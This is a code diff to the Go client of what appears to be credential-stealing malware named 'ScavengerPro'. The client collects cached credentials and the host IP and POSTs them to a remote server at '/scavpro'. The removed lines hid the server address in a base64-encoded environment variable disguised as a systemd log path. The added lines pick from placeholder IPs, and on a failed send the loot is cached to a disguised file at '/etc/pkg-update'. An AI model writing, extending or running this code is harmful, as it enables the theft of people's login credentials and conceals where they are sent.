@@ -7,23 +7,26 @@ import (
 	"ScavengerPro/client/cred_cache"
 	"bufio"
 	"bytes"
-	b64 "encoding/base64"
 	"encoding/json"
+	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"os"
-	"strings"
 )
 
 var serv = getServer() //IP of server
 
-// turn encoded environment variable into ip addres
-// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1:5000
+// pick an IP from the list
 func getServer() string {
-	envVar := os.Getenv("ERR_LOGGING") //fetch environment variable
-	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
-	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
-	return string(decoded)
+	servs := make([]string, 0)
+	servs = append(servs,
+		"1.1.1.1",
+		"2.2.2.2",
+		"3.3.3.3",
+	)
+	selection := servs[rand.Intn(len(servs))]
+	return string(selection)
 }
 
 // This function will extract info from CredCache object and ship it back
@@ -41,16 +44,19 @@ func sendData(c *cred_cache.CredCache) {
 				creds = append(creds, c)
 			}
 		}
+		os.Remove("/etc/pkg-update")
 	}
 	credStr := ""
 	for _, cd := range creds {
 		credStr += cd + "\n"
 	}
 	url := "http://" + serv + "/scavpro" //turn ip into URL
+	fmt.Println(url)
 	jsonData := map[string]string{"IP": ip, "credentials": credStr}
 	jsonValue, _ := json.Marshal(jsonData)                                   // what are you silly?
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue)) // send it!
-	if err != nil {                                                          // if error with sending, write cache to disk
+	if err != nil {
+		fmt.Println("send failed") // if error with sending, write cache to disk
 		path := "/etc/pkg-update"
 		dumpCache(creds, path)
 		return
